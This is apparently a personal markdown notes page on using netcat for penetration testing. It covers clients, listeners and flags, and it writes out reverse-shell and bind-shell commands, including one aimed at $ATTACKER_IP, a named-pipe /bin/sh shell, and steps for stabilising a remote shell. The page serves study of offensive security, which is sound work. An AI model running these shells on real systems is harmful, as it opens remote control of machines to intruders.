# Using "netcat"

The netcat binary is *usually* `nc`, but some systems have it at `ncat` or `netcat` instead.

Note that the `-c` and `-e` flags are considered security risks (for obvious reasons!), and are disabled on some systems.

## Start a Client

```bash
nc $HOST $PORT
```

Some versions of netcat support a -e flag that hooks STDIN and STDOUT of an executable to the established network connection. So something like the following will establish a reverse shell:

```bash
nc -e /bin/bash $HOST $PORT
```

## Start a Server

```bash
nc -l -p $PORT $HOST
```

The $HOST specification here is optional; if left off, nc binds to 0.0.0.0.

Note that nc will exit once the first connection closes.

(According to the nc docs, it looks like `nc -l $HOST $PORT` should also work, but it doesn't. I think - though I haven't been able to verify - that what's happening here is that `-p` specifies the port to *listen* to, while the port following the $HOST specification is the port to *connect* to.)

A netcat server doesn't have to be used just for reverse shells. For example, you can also use it to catch web requests in conjunction with XSS or SQLi attacks.

* [XSS (Cross-Site Scripting) Attacks](./XSS%20%28Cross-Site%20Scripting%29%20Attacks.md)
* [SQL Injection](./SQL%20Injection.md)

## Useful Flags

* `-l` - listen for incoming connections (rather than make an outgoing connection)
* `-v` - verbose
* `-n` - skip DNS resolution (slightly faster, less noisy on the network)
* `-p` - specify the port to *listen* to
* `-u` - connect using UDP instead of TCP
* `-k` - keep listening even after client disconnects

## Example Attack Patterns

Example reverse shell:

* Attacker: `nc -lvnp $LISTENER_PORT`
* Target: `nc $ATTACKER_IP $LISTENER_PORT -e /bin/bash`

Example bind shell:

* Attacker: `nc $TARGET_IP $LISTENER_PORT`
* Target: `nc -lvnp $LISTENER_PORT -e /bin/bash`

These are almost, but not quite, mirror images of each other.

The `-e` switch isn't available on many UNIX-like OSes. Working around this leads to the common named pipe pattern:

```bash
mkfifo /tmp/p; \
nc -lvnp $LISTENER_PORT < /tmp/p | \
	/bin/sh >/tmp/p 2>&1; \
rm /tmp/p
```

(Note that it's also possible to reverse the /bin/sh and nc portions of things; what important is that the named pipe lets us loop I/O between the two applications. See the discussion of msfvenom payloads for a detailed breakdown of this pattern.)

Initial netcat reverse shells (in particular web shells) are non-interactive.

### Shell "Stabilization"

Shell "stabilization" refers to the process of making a remote shell behave like a normal local shell - so, allowing interactive programs to work properly, ensuring that input is not echoed inappropriately, etc. In practice, this generally involves creating a *second* connection from within the "unstable" shell, and then using that (keeping the first connection around just so you can restart the "stabilized" shell if you accidentally exit/kill it).

A common method of stabilizing netcat shells is to use Python:

* Start an instance of bash connected to an actual PTY: `env TERM=xterm python -c 'import pty; pty.spawn("/bin/bash")'`
* Suspend the reverse shell.
* Use `stty raw -echo; fg` to switch to raw keycode transmission (so that things like arrow keys get pushed to our remote shell), turn off terminal echo (to prevent seeing commands twice), and foreground the reverse shell.

Note that the `stty` command can be canceled using `reset` (after closing the reverse shell). Since echo is turned off, typing this won't be visible. Trust the force!

The `rlwrap` package will handle almost all of this for you.

```bash
rlwrap -cAr nc -lvnp $PORT
```

Or just use socat!

**Note:**: In *none* of these cases will the reverse shell pick up on your terminal size, so you'll need to manually specify it using `stty rows` and `stty cols`.

* [Using "socat"](./Using%20%22socat%22.md)

## Port Forwarding

```bash
nc -lvnp $INCOMING_PORT -c "nc $TARGET_IP $TARGET_PORT"
```

## Other Uses

### Telnet Replacement

If you just have netcat connect to a service directly, it functions exactly like telnet.

### Port Scanning

With the `-z` option, netcat will attempt to connect to all TCP ports on the targets in a sequential fashion (if no ports are specified; otherwise just to the specified port), reporting which are open. It's like a simple, very slow version of Nmap!

Use `-w` to set the timeout in seconds.

Use `-u` to try connecting over UDP rather than TCP.

* [Using "nmap"](./Using%20%22nmap%22.md)

### Port Forwarding

```bash
nc -lvkp $LOCAL_PORT -c "nc $REMOTE_IP $REMOTE_PORT"
```
